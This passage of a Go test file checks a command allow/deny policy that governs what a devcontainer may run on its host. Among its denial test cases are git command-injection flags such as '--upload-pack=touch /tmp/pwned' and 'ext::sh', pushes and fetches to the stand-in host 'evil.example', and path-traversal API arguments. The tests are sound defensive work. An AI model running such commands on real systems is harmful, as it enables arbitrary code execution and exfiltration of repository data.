package rules

import (
	"errors"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"go.yaml.in/yaml/v3"
)

const exampleConfig = `
rules:
  - command: git
    args: none
  - command: git status
    args: any
  - command: tix pr list
    args: none
  - command: git push
    flags:
      allow: [-u, --set-upstream, --tags, -v]
      values:
        -o: { allow: [ci.skip] }
    positional:
      deny: [main, "+*", ":*"]
  - command: fakehost deploy
    flags:
      deny: [--force, -f, -y]
      values:
        --project: { allow: [example-dev] }
        --profile: {}
        --only: { deny: ["functions*"] }
  - command: git fetch
    positional:
      allow: [origin, "feature/*"]
`

func mustParse(t *testing.T, config string) *Policy {
	t.Helper()
	p, err := Parse([]byte(config))
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	return p
}

func TestCheck(t *testing.T) {
	p := mustParse(t, exampleConfig)
	cases := []struct {
		argv string
		deny string // expected denial message; empty means allowed
	}{
		// Matching.
		{"git status --porcelain", ""},
		{"git", ""},
		{"git reset --hard", `denied by rule "git": arguments are not allowed`},
		{"docker run x", `no rule allows "docker run"`},
		{"/usr/bin/git status", `no rule allows "/usr/bin/git status"`},

		// args: none.
		{"tix pr list", ""},
		{"tix pr list --json", `denied by rule "tix pr list": arguments are not allowed`},

		// flags.allow (strict) with a value filter.
		{"git push -u origin feature", ""},
		{"git push --set-upstream origin feature", ""},
		{"git push --force origin feature", `denied by rule "git push": flag --force is not allowed`},
		{"git push -uv origin feature", ""},
		{"git push -uf origin feature", `denied by rule "git push": flag -f is not allowed`},
		{"git push --tags=x origin", `denied by rule "git push": flag --tags does not take a value`},
		{"git push -o ci.skip origin feature", ""},
		{"git push -oci.skip origin feature", ""},
		{"git push -o skip-ci origin feature", `denied by rule "git push": value "skip-ci" of flag -o is not allowed`},
		{"git push -o ci.skip -o other origin", `denied by rule "git push": value "other" of flag -o is not allowed`},
		{"git push origin feature -o", `denied by rule "git push": flag -o needs a value`},
		{"git push --forc origin", `denied by rule "git push": flag --forc is not allowed`},

		// positional.deny, globs crossing "/".
		{"git push origin main", `denied by rule "git push": argument "main" is denied`},
		{"git push origin +refs/heads/main", `denied by rule "git push": argument "+refs/heads/main" is denied`},
		{"git push origin :feature", `denied by rule "git push": argument ":feature" is denied`},
		{"git push -- origin main", `denied by rule "git push": argument "main" is denied`},
		{"git push -u -- --force", ""}, // after --, --force is a positional

		// flags.deny (best effort).
		{"fakehost deploy --only hosting", ""},
		{"fakehost deploy --force", `denied by rule "fakehost deploy": flag --force is not allowed`},
		{"fakehost deploy --forc", `denied by rule "fakehost deploy": flag --forc is not allowed`},
		{"fakehost deploy -yf", `denied by rule "fakehost deploy": flag -y is not allowed`},
		{"fakehost deploy --non-interactive", ""},
		{"fakehost deploy --project example-dev", ""},
		{"fakehost deploy --project=prod", `denied by rule "fakehost deploy": value "prod" of flag --project is not allowed`},
		{"fakehost deploy --proj=prod", `denied by rule "fakehost deploy": value "prod" of flag --project is not allowed`},
		{"fakehost deploy --pro=x", `denied by rule "fakehost deploy": flag --pro is ambiguous`},
		{"fakehost deploy --proj prod", `denied by rule "fakehost deploy": abbreviated flag --proj must be given its value as --proj=value`},
		{"git push --tag origin", `denied by rule "git push": flag --tag is not allowed`}, // allow mode: no abbreviations
		{"git push -ü origin", `denied by rule "git push": flag -ü is not allowed`},
		{"fakehost deploy --only functions:api", `denied by rule "fakehost deploy": value "functions:api" of flag --only is denied`},
		{"fakehost deploy --profile anything", ""},

		// positional.allow.
		{"git fetch origin feature/a/b", ""},
		{"git fetch origin main", `denied by rule "git fetch": argument "main" is not allowed`},
		{"git fetch --prune origin", ""}, // no flags section: flags unrestricted
		{"git fetch - origin", `denied by rule "git fetch": argument "-" is not allowed`},
	}
	for _, tc := range cases {
		t.Run(tc.argv, func(t *testing.T) {
			expectCheck(t, p, strings.Fields(tc.argv), tc.deny)
		})
	}
}

func TestCheckRejectsEmptyArgv(t *testing.T) {
	if _, err := mustParse(t, exampleConfig).Check(nil); err == nil {
		t.Fatal("empty argv allowed")
	}
}

func TestParseRejectsInvalidConfig(t *testing.T) {
	cases := map[string]string{
		"unknown key":              "rules:\n  - command: git\n    arg: any\n",
		"invalid yaml":             "rules: [",
		"empty command":            "rules:\n  - command: \" \"\n    args: any\n",
		"duplicate command":        "rules:\n  - command: git  push\n    args: any\n  - command: git push\n    args: none\n",
		"bad args":                 "rules:\n  - command: git\n    args: some\n",
		"args with flags":          "rules:\n  - command: git\n    args: any\n    flags:\n      allow: [-v]\n",
		"args with positional":     "rules:\n  - command: git\n    args: none\n    positional:\n      allow: [x]\n",
		"flags allow and deny":     "rules:\n  - command: git\n    flags:\n      allow: [-v]\n      deny: [-f]\n",
		"positional both":          "rules:\n  - command: git\n    positional:\n      allow: [a]\n      deny: [b]\n",
		"value filter both":        "rules:\n  - command: git\n    flags:\n      values:\n        -o: { allow: [a], deny: [b] }\n",
		"flag without dash":        "rules:\n  - command: git\n    flags:\n      allow: [force]\n",
		"value flag without dash":  "rules:\n  - command: git\n    flags:\n      values:\n        o: {}\n",
		"empty rule":               "rules:\n  - command: git\n",
		"no rules key":             "commands: []\n",
		"empty flags":              "rules:\n  - command: git\n    flags: {}\n",
		"empty positional":         "rules:\n  - command: git\n    positional: {}\n",
		"null allow list":          "rules:\n  - command: rm\n    positional:\n      allow:\n",
		"null flag deny list":      "rules:\n  - command: rm\n    flags:\n      deny:\n",
		"empty values":             "rules:\n  - command: git\n    flags:\n      values: {}\n",
		"single-dash long flag":    "rules:\n  - command: terraform\n    flags:\n      deny: [-auto-approve]\n",
		"flag name with =":         "rules:\n  - command: git\n    flags:\n      allow: [--x=y]\n",
		"long value flag one dash": "rules:\n  - command: git\n    flags:\n      values:\n        -ab: {}\n",
		"relative program":         "rules:\n  - command: ./deploy.sh\n    args: any\n",
		"relative program in dir":  "rules:\n  - command: bin/tool\n    args: any\n",
		"second document":          "rules:\n  - command: git\n    args: any\n---\nrules:\n  - command: rm\n    args: any\n",

		// A list is exactly one of allow, deny, allow_regex and deny_regex.
		"allow and allow_regex":       "rules:\n  - command: git\n    positional:\n      allow: [a]\n      allow_regex: [a]\n",
		"allow and deny_regex":        "rules:\n  - command: git\n    positional:\n      allow: [a]\n      deny_regex: [b]\n",
		"deny and allow_regex":        "rules:\n  - command: git\n    positional:\n      deny: [b]\n      allow_regex: [a]\n",
		"deny and deny_regex":         "rules:\n  - command: git\n    positional:\n      deny: [b]\n      deny_regex: [b]\n",
		"allow_regex and deny_regex":  "rules:\n  - command: git\n    positional:\n      allow_regex: [a]\n      deny_regex: [b]\n",
		"value flag list both regex":  "rules:\n  - command: git\n    flags:\n      values:\n        -o: { allow_regex: [a], deny_regex: [b] }\n",
		"value flag list glob, regex": "rules:\n  - command: git\n    flags:\n      values:\n        -o: { allow: [a], allow_regex: [a] }\n",

		// A path check is open or check, and only where a list is allowed.
		"path mode unknown":    "rules:\n  - command: abx install\n    positional:\n      path: resolve\n",
		"path mode upper case": "rules:\n  - command: abx install\n    positional:\n      path: Open\n",
		"flag value path mode": "rules:\n  - command: abx install\n    flags:\n      values:\n        -o: { path: yes }\n",
		"path with args any":   "rules:\n  - command: abx install\n    args: any\n    positional:\n      path: open\n",
		"path under flags":     "rules:\n  - command: abx install\n    flags:\n      allow: [-r]\n      path: open\n",
		"path with two lists":  "rules:\n  - command: abx install\n    positional:\n      allow: [a]\n      deny: [b]\n      path: open\n",
	}
	for name, config := range cases {
		t.Run(name, func(t *testing.T) {
			if _, err := Parse([]byte(config)); err == nil {
				t.Fatalf("accepted:\n%s", config)
			}
		})
	}
}

func TestParseReportsLineOfUnknownKey(t *testing.T) {
	_, err := Parse([]byte("rules:\n  - command: git\n    arg: any\n"))
	if err == nil || !strings.Contains(err.Error(), "line 3") {
		t.Fatalf("got %v, want an error pointing at line 3", err)
	}
}

func TestLoadMissingFileDeniesEverything(t *testing.T) {
	p, err := Load(filepath.Join(t.TempDir(), "hostrun.yaml"))
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	_, err = p.Check([]string{"git", "status"})
	if err == nil || err.Error() != "no rules file: every command is denied" {
		t.Fatalf("got %v, want a missing-config denial", err)
	}
}

func TestLoadReportsInvalidFile(t *testing.T) {
	path := filepath.Join(t.TempDir(), "hostrun.yaml")
	if err := os.WriteFile(path, []byte("rules:\n  - command: git\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := Load(path); err == nil || !strings.Contains(err.Error(), path) {
		t.Fatalf("got %v, want an error naming %s", err, path)
	}
}

func TestLoadReadsValidFile(t *testing.T) {
	path := filepath.Join(t.TempDir(), "hostrun.yaml")
	if err := os.WriteFile(path, []byte(exampleConfig), 0o644); err != nil {
		t.Fatal(err)
	}
	p, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := p.Check([]string{"git", "status"}); err != nil {
		t.Fatalf("allowed command denied: %v", err)
	}
}

func TestGlob(t *testing.T) {
	cases := []struct {
		pattern, value string
		want           bool
	}{
		{"main", "main", true},
		{"main", "main2", false},
		{"+*", "+refs/heads/main", true},
		{"feature/*", "feature/a/b", true},
		{"feature/*", "feat", false},
		{"v?", "v1", true},
		{"v?", "v10", false},
		{"*", "", true},
		{"a*b*c", "axxbyyc", true},
		{"a*b*c", "axxbyy", false},
		{"[x]", "[x]", true}, // no character classes: brackets are literal
		{"?", "ü", true},
		{"a?c", "aüc", true},
	}
	for _, tc := range cases {
		if got := glob(tc.pattern, tc.value); got != tc.want {
			t.Errorf("glob(%q, %q) = %v, want %v", tc.pattern, tc.value, got, tc.want)
		}
	}
}

func TestDenyListIsCheckedBeforeAbbreviations(t *testing.T) {
	p := mustParse(t, `
rules:
  - command: git push
    flags:
      deny: [--force]
      values:
        --force-with-lease: {}
`)
	// --force is a prefix of the value flag --force-with-lease, but it is a
	// denied flag of its own and must not swallow the next token as a value.
	_, err := p.Check(strings.Fields("git push --force origin"))
	if err == nil || err.Error() != `denied by rule "git push": flag --force is not allowed` {
		t.Fatalf("got %v, want --force denied", err)
	}
	if _, err := p.Check(strings.Fields("git push --force-with-lease origin main")); err != nil {
		t.Fatalf("declared value flag denied: %v", err)
	}
}

func TestExplicitEmptyAllowListAllowsNothing(t *testing.T) {
	p := mustParse(t, "rules:\n  - command: ls\n    positional:\n      allow: []\n")
	if _, err := p.Check([]string{"ls"}); err != nil {
		t.Fatalf("bare command denied: %v", err)
	}
	if _, err := p.Check([]string{"ls", "x"}); err == nil {
		t.Fatal("positional argument allowed by an empty allow list")
	}
}

func TestAbsoluteProgramPathIsAllowed(t *testing.T) {
	p := mustParse(t, "rules:\n  - command: /usr/bin/git status\n    args: any\n")
	if _, err := p.Check([]string{"/usr/bin/git", "status"}); err != nil {
		t.Fatal(err)
	}
}

func TestMissingValueAtEndIsDenied(t *testing.T) {
	p := mustParse(t, exampleConfig)
	for _, argv := range []string{"fakehost deploy --project", "fakehost deploy --only"} {
		if _, err := p.Check(strings.Fields(argv)); err == nil || !strings.Contains(err.Error(), "needs a value") {
			t.Errorf("%s: got %v, want a missing-value denial", argv, err)
		}
	}
}

func TestLoadReportsUnreadableFile(t *testing.T) {
	// A directory where the file should be: unreadable, not missing.
	if _, err := Load(t.TempDir()); err == nil {
		t.Fatal("an unreadable config was treated as missing")
	}
}

func TestDigestIdentifiesTheLoadedFile(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "hostrun.yaml")
	load := func() string {
		t.Helper()
		p, err := Load(path)
		if err != nil {
			t.Fatal(err)
		}
		return p.Digest()
	}
	missing := load()
	if missing != load() {
		t.Fatal("digest of a missing file is not stable")
	}
	if err := os.WriteFile(path, []byte(exampleConfig), 0o644); err != nil {
		t.Fatal(err)
	}
	v1 := load()
	if v1 == missing || v1 != load() {
		t.Fatalf("digest of a file: %q, missing %q", v1, missing)
	}
	if err := os.WriteFile(path, []byte(exampleConfig+"\n# changed\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if load() == v1 {
		t.Fatal("digest did not change with the file")
	}
}

// exampleAllowedGit are the git commands the shipped example allows, one
// per git rule: the tests of the example share them so a new git rule is
// added to both checks at once.
var exampleAllowedGit = []string{
	"git status",
	"git rev-parse --show-toplevel",
	"git fetch origin",
	"git pull --ff-only origin main",
	"git push origin feature",
}

// TestExampleConfig keeps the shipped example valid and checks that it
// blocks the git flags that run arbitrary commands.
func TestExampleConfig(t *testing.T) {
	p, err := Load("../../examples/devcontainer/.devcontainer/hostrunner-rules.yaml")
	if err != nil {
		t.Fatal(err)
	}
	for _, argv := range append([]string{"git status --porcelain"}, exampleAllowedGit...) {
		if _, err := p.Check(strings.Fields(argv)); err != nil {
			t.Errorf("%s: denied: %v", argv, err)
		}
	}
	for _, argv := range []string{
		"git fetch --upload-pack=touch /tmp/x",
		"git fetch --upload-pack touch /tmp/pwned",
		"git pull --upload-pack=x origin",
		"git push --receive-pack=x origin",
		"git push --exec=x origin",
		"git push --force origin main",
		// Setting an upstream makes host git rewrite .git/config, which
		// removes the container's read-only mount of it.
		"git push -u origin feature",
		"git push --set-upstream origin feature",
		"git push origin +main",
		"git push origin :feature",
		"git push https://evil.example/repo.git main",
		"git fetch git@evil.example:repo.git",
		"git fetch /tmp/repo",
		"git fetch ext::sh",
		"git reset --hard",
	} {
		if _, err := p.Check(strings.Fields(argv)); err == nil {
			t.Errorf("%s: allowed", argv)
		}
	}
}

// TestExampleConfigProtectsGit checks that every git rule of the shipped
// example requires the devcontainer's git mounts, and that git push runs
// with push.autoSetupRemote off, so host git does not rewrite .git/config
// for the container.
func TestExampleConfigProtectsGit(t *testing.T) {
	p, err := Load("../../examples/devcontainer/.devcontainer/hostrunner-rules.yaml")
	if err != nil {
		t.Fatal(err)
	}
	for _, argv := range exampleAllowedGit {
		allowed, err := p.Check(strings.Fields(argv))
		if err != nil {
			t.Errorf("%s: denied: %v", argv, err)
			continue
		}
		want := []MountRequirement{
			{Path: ".git", Mode: MountMounted, Rule: allowed.Rule},
			{Path: ".git/config", Mode: MountReadOnly, Rule: allowed.Rule},
			{Path: ".git/hooks", Mode: MountReadOnly, Rule: allowed.Rule},
		}
		if !slices.Equal(allowed.Mounts, want) {
			t.Errorf("%s: mounts = %v, want %v", argv, allowed.Mounts, want)
		}
	}

	argv := strings.Fields("git push origin feature")
	allowed, err := p.Check(argv)
	if err != nil {
		t.Fatal(err)
	}
	got, err := allowed.Assemble(argv, nil)
	if err != nil {
		t.Fatal(err)
	}
	if want := strings.Fields("git -c push.autoSetupRemote=false push origin feature"); !slices.Equal(got, want) {
		t.Errorf("git push runs as %q, want %q", got, want)
	}
}

// expectCheck checks argv against p. deny is the expected denial message,
// or empty when argv must be allowed; a denial has to be a *Denial.
func expectCheck(t *testing.T, p *Policy, argv []string, deny string) {
	t.Helper()
	_, err := p.Check(argv)
	switch {
	case deny == "" && err != nil:
		t.Errorf("%q: denied: %v", argv, err)
	case deny != "" && err == nil:
		t.Errorf("%q: allowed, want %q", argv, deny)
	case deny != "" && err.Error() != deny:
		t.Errorf("%q: got %q, want %q", argv, err.Error(), deny)
	}
	var d *Denial
	if err != nil && !errors.As(err, &d) {
		t.Errorf("%q: error %T is not a *Denial", argv, err)
	}
}

// The API path of issue #18: a glob cannot hold it inside the repository,
// an anchored regex can.
func TestAllowRegexConfinesPositionalArguments(t *testing.T) {
	p := mustParse(t, `
rules:
  - command: tix api
    positional:
      allow_regex:
        - '^/repos/example/example-app/issues(/[0-9]+)?(\?state=(open|closed))?$'
`)
	cases := []struct{ arg, deny string }{
		{"/repos/example/example-app/issues", ""},
		{"/repos/example/example-app/issues/42", ""},
		{"/repos/example/example-app/issues?state=open", ""},

		// The values a glob list let through.
		{
			"/repos/example/example-app/../../../user",
			`denied by rule "tix api": argument "/repos/example/example-app/../../../user" is not allowed`,
		},
		{
			"/repos/example/example-app/issues/%2e%2e/%2e%2e/keys",
			`denied by rule "tix api": argument "/repos/example/example-app/issues/%2e%2e/%2e%2e/keys" is not allowed`,
		},
		{
			"/repos/example/example-app/keys",
			`denied by rule "tix api": argument "/repos/example/example-app/keys" is not allowed`,
		},

		// `\?` is a literal "?", not a wildcard that also matches "/".
		{
			"/repos/example/example-app/issues/state=open",
			`denied by rule "tix api": argument "/repos/example/example-app/issues/state=open" is not allowed`,
		},
	}
	for _, tc := range cases {
		expectCheck(t, p, []string{"tix", "api", tc.arg}, tc.deny)
	}
}

func TestDenyRegexDeniesAMatchAnywhereInTheValue(t *testing.T) {
	p := mustParse(t, `
rules:
  - command: tix api
    positional:
      deny_regex: ['\.\.', '%']
`)
	cases := []struct{ arg, deny string }{
		{"/repos/a/b/issues", ""},
		{"/repos/a/b/v1.2", ""}, // one dot is not ".."
		{"/repos/a/b/../../user", `denied by rule "tix api": argument "/repos/a/b/../../user" is denied`},
		{"/repos/a/b/issues/%2e%2e/keys", `denied by rule "tix api": argument "/repos/a/b/issues/%2e%2e/keys" is denied`},
	}
	for _, tc := range cases {
		expectCheck(t, p, []string{"tix", "api", tc.arg}, tc.deny)
	}
}

func TestParseNamesTheRegexThatDoesNotCompile(t *testing.T) {
	cases := map[string]struct {
		config string
		want   []string // parts the error has to contain
	}{
		"positional": {
			"rules:\n  - command: git\n    args: any\n  - command: tix api\n    positional:\n      allow_regex: ['^/issues$', '^/issues/[0-9]++$']\n",
			[]string{"rule 2", `"tix api" positional`, "allow_regex", "^/issues/[0-9]++$"},
		},
		"flag value": {
			"rules:\n  - command: tix api\n    flags:\n      values:\n        --method: { deny_regex: ['^(GET$'] }\n",
			[]string{"rule 1", `"tix api" flags`, "--method", "deny_regex", "^(GET$"},
		},
		// The pattern is shown as it is written in the rules file.
		"backslash": {
			"rules:\n  - command: tix api\n    positional:\n      allow_regex: ['^/issues\\?state=[a-z]++$']\n",
			[]string{"`^/issues\\?state=[a-z]++$`"},
		},
	}
	for name, tc := range cases {
		t.Run(name, func(t *testing.T) {
			_, err := Parse([]byte(tc.config))
			if err == nil {
				t.Fatalf("accepted:\n%s", tc.config)
			}
			for _, part := range tc.want {
				if !strings.Contains(err.Error(), part) {
					t.Errorf("error %q does not name %q", err, part)
				}
			}
		})
	}
}

func TestParseSaysWhichKeysAListTakes(t *testing.T) {
	cases := map[string]struct{ config, want string }{
		"null key": {
			"rules:\n  - command: rm\n    positional:\n      allow_regex:\n",
			`rule 1: "rm" positional: set allow, deny, allow_regex, deny_regex or path`,
		},
		"two keys": {
			"rules:\n  - command: rm\n    positional:\n      allow: [a]\n      allow_regex: [a]\n",
			`rule 1: "rm" positional: use only one of allow, allow_regex`,
		},
		"two keys of a value flag": {
			"rules:\n  - command: rm\n    flags:\n      values:\n        -o: { allow_regex: [a], deny_regex: [b] }\n",
			`rule 1: "rm" flags: value of -o: use only one of allow_regex, deny_regex`,
		},
	}
	for name, tc := range cases {
		t.Run(name, func(t *testing.T) {
			if _, err := Parse([]byte(tc.config)); err == nil || err.Error() != tc.want {
				t.Fatalf("got %v, want %q", err, tc.want)
			}
		})
	}
}

// Flag names are literal: a regex key directly under flags is an unknown
// key, reported with its line like any other.
func TestParseRejectsRegexKeysUnderFlags(t *testing.T) {
	for _, key := range []string{"allow_regex", "deny_regex"} {
		t.Run(key, func(t *testing.T) {
			_, err := Parse([]byte("rules:\n  - command: git\n    flags:\n      allow: [-v]\n      " + key + ": ['^-v$']\n"))
			if err == nil || !strings.Contains(err.Error(), "line 5") || !strings.Contains(err.Error(), key) {
				t.Fatalf("got %v, want an error naming %s at line 5", err, key)
			}
		})
	}
}

func TestRegexListFiltersEverySpellingOfAFlagValue(t *testing.T) {
	p := mustParse(t, `
rules:
  - command: tix api
    flags:
      allow: []
      values:
        --method: { allow_regex: ['^(GET|HEAD)$'] }
        -X: { allow_regex: ['^(GET|HEAD)$'] }
        --field: { deny_regex: ['^token='] }
`)
	cases := []struct{ argv, deny string }{
		{"tix api --method GET", ""},
		{"tix api --method=HEAD", ""},
		{"tix api -X GET", ""},
		{"tix api -XHEAD", ""},
		{"tix api --method POST", `denied by rule "tix api": value "POST" of flag --method is not allowed`},
		{"tix api --method=POST", `denied by rule "tix api": value "POST" of flag --method is not allowed`},
		{"tix api -X POST", `denied by rule "tix api": value "POST" of flag -X is not allowed`},
		{"tix api -XPOST", `denied by rule "tix api": value "POST" of flag -X is not allowed`},
		{"tix api --method GETS", `denied by rule "tix api": value "GETS" of flag --method is not allowed`},

		// Every occurrence of a repeated flag is checked.
		{"tix api --method GET --method DELETE", `denied by rule "tix api": value "DELETE" of flag --method is not allowed`},
		{"tix api --field state=open", ""},
		{"tix api --field state=open --field token=x", `denied by rule "tix api": value "token=x" of flag --field is denied`},
	}
	for _, tc := range cases {
		expectCheck(t, p, strings.Fields(tc.argv), tc.deny)
	}
}

// hostrunner adds no anchors: an allow pattern without ^…$ allows every
// value that contains a match.
func TestUnanchoredAllowRegexMatchesInsideTheValue(t *testing.T) {
	p := mustParse(t, "rules:\n  - command: tix api\n    positional:\n      allow_regex: ['/repos/a/b/issues']\n")
	expectCheck(t, p, []string{"tix", "api", "/repos/a/b/issues"}, "")
	expectCheck(t, p, []string{"tix", "api", "/x/repos/a/b/issues/../../user"}, "")
	expectCheck(t, p, []string{"tix", "api", "/repos/a/b/pulls"},
		`denied by rule "tix api": argument "/repos/a/b/pulls" is not allowed`)
}

func TestAnyPatternOfARegexListMatches(t *testing.T) {
	p := mustParse(t, "rules:\n  - command: tix api\n    positional:\n      allow_regex: ['^/issues$', '^/pulls$']\n")
	expectCheck(t, p, []string{"tix", "api", "/issues"}, "")
	expectCheck(t, p, []string{"tix", "api", "/pulls"}, "")
	expectCheck(t, p, []string{"tix", "api", "/issues", "/keys"},
		`denied by rule "tix api": argument "/keys" is not allowed`)
}

// ^ and $ are the ends of the value, not of a line in it.
func TestAnchoredRegexDoesNotMatchAValueWithANewline(t *testing.T) {
	p := mustParse(t, "rules:\n  - command: tix api\n    positional:\n      allow_regex: ['^/issues$']\n")
	expectCheck(t, p, []string{"tix", "api", "/issues\n"},
		`denied by rule "tix api": argument "/issues\n" is not allowed`)
	expectCheck(t, p, []string{"tix", "api", "/issues\n/keys"},
		`denied by rule "tix api": argument "/issues\n/keys" is not allowed`)
	expectCheck(t, p, []string{"tix", "api", "/keys\n/issues"},
		`denied by rule "tix api": argument "/keys\n/issues" is not allowed`)
}

func TestExplicitEmptyRegexAllowListAllowsNothing(t *testing.T) {
	p := mustParse(t, "rules:\n  - command: ls\n    positional:\n      allow_regex: []\n")
	expectCheck(t, p, []string{"ls"}, "")
	expectCheck(t, p, []string{"ls", "x"}, `denied by rule "ls": argument "x" is not allowed`)
}

// A path check stands alone or next to one pattern key, under positional and
// under a value flag.
func TestParseAcceptsPathCheck(t *testing.T) {
	cases := map[string]string{
		"positional open":      "rules:\n  - command: abx install\n    positional:\n      path: open\n",
		"positional check":     "rules:\n  - command: abx install\n    positional:\n      path: check\n",
		"with allow":           "rules:\n  - command: abx install\n    positional:\n      allow: ['*.pkg']\n      path: open\n",
		"with deny":            "rules:\n  - command: abx install\n    positional:\n      deny: ['*.tmp']\n      path: check\n",
		"with allow_regex":     "rules:\n  - command: abx install\n    positional:\n      allow_regex: ['\\.pkg$']\n      path: open\n",
		"with deny_regex":      "rules:\n  - command: abx install\n    positional:\n      deny_regex: ['^-']\n      path: check\n",
		"flag value open":      "rules:\n  - command: abx install\n    flags:\n      values:\n        --dat: { path: open }\n",
		"flag value with glob": "rules:\n  - command: abx install\n    flags:\n      values:\n        -o: { allow: ['*.dat'], path: check }\n",
	}
	for name, config := range cases {
		t.Run(name, func(t *testing.T) {
			if _, err := Parse([]byte(config)); err != nil {
				t.Fatalf("rejected: %v\n%s", err, config)
			}
		})
	}
}

func TestParseSaysWhichPathModesExist(t *testing.T) {
	_, err := Parse([]byte("rules:\n  - command: abx install\n    positional:\n      path: resolve\n"))
	want := `rule 1: "abx install" positional: path must be open or check, not "resolve"`
	if err == nil || err.Error() != want {
		t.Fatalf("got %v, want %q", err, want)
	}
}

// The patterns of a list see the argument as given and still deny it; a
// denied command reports no path arguments.
func TestPathCheckDoesNotWidenTheList(t *testing.T) {
	p := mustParse(t, "rules:\n  - command: abx install\n    positional:\n      allow: ['*.pkg']\n      path: open\n")
	allowed, err := p.Check([]string{"abx", "install", "notes.txt"})
	if err == nil || err.Error() != `denied by rule "abx install": argument "notes.txt" is not allowed` {
		t.Fatalf("got %v, want the list's denial", err)
	}
	if allowed.Paths != nil {
		t.Fatalf("denied command reported path arguments %+v", allowed.Paths)
	}
}

func TestCheckReportsTheMountsOfTheMatchedRule(t *testing.T) {
	p := mustParse(t, "rules:\n  - command: git\n    args: any\n    mounts:\n      .git: mounted\n      .git/hooks: read-only\n")
	allowed, err := p.Check([]string{"git", "status"})
	if err != nil {
		t.Fatal(err)
	}
	want := []MountRequirement{{Path: ".git", Mode: MountMounted, Rule: "git"}, {Path: ".git/hooks", Mode: MountReadOnly, Rule: "git"}}
	if !slices.Equal(allowed.Mounts, want) {
		t.Fatalf("got %v, want %v", allowed.Mounts, want)
	}
}

func TestMountsAreSortedByPath(t *testing.T) {
	p := mustParse(t, "rules:\n  - command: git\n    args: any\n    mounts:\n      .git/hooks: read-only\n      .git: mounted\n      .git/config: read-only\n")
	allowed, err := p.Check([]string{"git"})
	if err != nil {
		t.Fatal(err)
	}
	want := []MountRequirement{
		{Path: ".git", Mode: MountMounted, Rule: "git"},
		{Path: ".git/config", Mode: MountReadOnly, Rule: "git"},
		{Path: ".git/hooks", Mode: MountReadOnly, Rule: "git"},
	}
	if !slices.Equal(allowed.Mounts, want) {
		t.Fatalf("got %v, want %v", allowed.Mounts, want)
	}
}

// A path two rules name with different modes is required with both, and
// the union is sorted by path, then mode.
func TestMountsOfSeveralRulesKeepBothModesOfAPathSortedByPathThenMode(t *testing.T) {
	p := mustParse(t, "rules:\n"+
		"  - command: git\n    args: any\n    mounts:\n      .git/hooks: read-only\n      .git/config: read-only\n"+
		"  - command: git commit\n    args: any\n    mounts:\n      .git/hooks: mounted\n      .git: mounted\n")
	allowed, err := p.Check([]string{"git", "commit"})
	if err != nil {
		t.Fatal(err)
	}
	want := []MountRequirement{
		{Path: ".git", Mode: MountMounted, Rule: "git commit"},
		{Path: ".git/config", Mode: MountReadOnly, Rule: "git"},
		{Path: ".git/hooks", Mode: MountMounted, Rule: "git commit"},
		{Path: ".git/hooks", Mode: MountReadOnly, Rule: "git"},
	}
	if !slices.Equal(allowed.Mounts, want) {
		t.Fatalf("got %v, want %v", allowed.Mounts, want)
	}
}

func TestMountModeStringIsTheYAMLSpelling(t *testing.T) {
	if got := MountMounted.String(); got != "mounted" {
		t.Errorf("MountMounted: got %q", got)
	}
	if got := MountReadOnly.String(); got != "read-only" {
		t.Errorf("MountReadOnly: got %q", got)
	}
}

// TestParseRejectsInvalidMounts checks each refusal of a mounts entry and
// that it names the line of the entry. The entries start at line 5.
func TestParseRejectsInvalidMounts(t *testing.T) {
	const head = "rules:\n  - command: git\n    args: any\n    mounts:\n"
	cases := map[string]struct{ entries, want string }{
		"unknown mode": {
			"      .git: mounted\n      .git/config: rw\n",
			`rule 1: "git": mounts: path ".git/config": mode must be mounted or read-only, not "rw" (line 6)`,
		},
		"non-string mode": {
			"      .git: mounted\n      .git/config: true\n      .git/hooks: [read-only]\n",
			`rule 1: "git": mounts: path ".git/config": mode must be the string mounted or read-only (line 6)`,
		},
		"absolute path": {
			"      .git: mounted\n      /etc: read-only\n",
			`rule 1: "git": mounts: path "/etc" must be relative to the workspace root (line 6)`,
		},
		"parent component first": {
			"      ../etc: read-only\n",
			`rule 1: "git": mounts: path "../etc" must not contain a .. component (line 5)`,
		},
		"parent component inside": {
			"      .git: mounted\n      a/../b: mounted\n",
			`rule 1: "git": mounts: path "a/../b" must not contain a .. component (line 6)`,
		},
		"parent only": {
			"      ..: mounted\n",
			`rule 1: "git": mounts: path ".." must not contain a .. component (line 5)`,
		},
		"leading dot component": {
			"      ./.git: mounted\n",
			`rule 1: "git": mounts: path "./.git" is not clean, use ".git" (line 5)`,
		},
		"trailing slash": {
			"      .git/: mounted\n",
			`rule 1: "git": mounts: path ".git/" is not clean, use ".git" (line 5)`,
		},
		"double slash": {
			"      .git: mounted\n      a//b: mounted\n",
			`rule 1: "git": mounts: path "a//b" is not clean, use "a/b" (line 6)`,
		},
		"dot inside": {
			"      a/./b: mounted\n",
			`rule 1: "git": mounts: path "a/./b" is not clean, use "a/b" (line 5)`,
		},
		"workspace root": {
			"      .: mounted\n",
			`rule 1: "git": mounts: path "." is not a path below the workspace root (line 5)`,
		},
		"empty path": {
			"      \"\": mounted\n",
			`rule 1: "git": mounts: path "" is not a path below the workspace root (line 5)`,
		},
		"duplicate path": {
			"      .git: mounted\n      .git/config: read-only\n      .git: read-only\n",
			`rule 1: "git": mounts: duplicate path ".git" (line 7)`,
		},
		"non-string path": {
			"      .git: mounted\n      5: read-only\n",
			`rule 1: "git": mounts: path must be a string (line 6)`,
		},
		"list instead of a mapping": {
			"      - .git\n",
			`rule 1: "git": mounts: not a mapping of workspace paths to modes (line 5)`,
		},
		"scalar instead of a mapping": {
			"      mounted\n",
			`rule 1: "git": mounts: not a mapping of workspace paths to modes (line 5)`,
		},
		"null instead of a mapping": {
			"",
			`rule 1: "git": mounts: not a mapping of workspace paths to modes (line 4)`,
		},
	}
	for name, tc := range cases {
		t.Run(name, func(t *testing.T) {
			_, err := Parse([]byte(head + tc.entries))
			if err == nil || err.Error() != tc.want {
				t.Fatalf("got %v, want %q", err, tc.want)
			}
		})
	}
}

// TestParseResolvesAMountsAlias checks that `mounts: *name` gives a rule
// the requirements of the anchored map of another rule, so a group of rules
// can share one block instead of repeating it.
func TestParseResolvesAMountsAlias(t *testing.T) {
